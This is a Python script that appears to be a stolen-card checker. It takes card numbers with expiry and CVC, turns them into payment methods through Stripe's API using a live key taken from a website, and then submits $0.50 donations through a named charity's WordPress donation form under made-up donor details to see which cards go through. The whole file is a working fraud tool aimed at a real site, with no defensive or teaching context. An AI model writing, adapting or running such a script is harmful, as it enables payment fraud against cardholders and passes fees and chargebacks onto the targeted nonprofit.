import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51LuhhlF5bAJ1x6aDt0vS7sBr07ubGomr0JPagB4trMCOk1cKk0g6Jd8oUWLnK82WOBsBW30DtchLxd05YwZCEQoE000HKcluLl&'

	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
    '__stripe_mid': '348bd807-2857-41ea-98ac-7236339bc5b0b6e0b6',
    '__stripe_sid': '5bbb2089-f2cb-487b-92d1-eef901df8f17d1e8a6',
}

	headers = {
    'authority': 'orlandodistaffday.org',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '__stripe_mid=348bd807-2857-41ea-98ac-7236339bc5b0b6e0b6; __stripe_sid=5bbb2089-f2cb-487b-92d1-eef901df8f17d1e8a6',
    'origin': 'https://orlandodistaffday.org',
    'referer': 'https://orlandodistaffday.org/support-orlando-distaff-day/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

	params = {
    't': '1730701279759',
}

	data = {
    	'data': '__fluent_form_embded_post_id=2539&_fluentform_32_fluentformnonce=23078e15dc&_wp_http_referer=%2Fsupport-orlando-distaff-day%2F&names%5Bfirst_name%5D=Niko&names%5Blast_name%5D=Lame&input_text_2=09976935050&email=bohtoobb%40gmail.com&address1%5Baddress_line_1%5D=Main&address1%5Baddress_line_2%5D=&address1%5Bcity%5D=Ney%20work&address1%5Bstate%5D=Zabu&address1%5Bzip%5D=100003&address1%5Bcountry%5D=US&custom-payment-amount=0.50&payment_method=stripe&description=&alt_s=&ecytiz4492=628564&item__32__fluent_checkme_=&__stripe_payment_method_id='+str(pm)+'',
    'action': 'fluentform_submit',
    'form_id': '32',
}

	r2 = requests.post(
    'https://orlandodistaffday.org/wp-admin/admin-ajax.php',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
)
	
	return (r2.json())
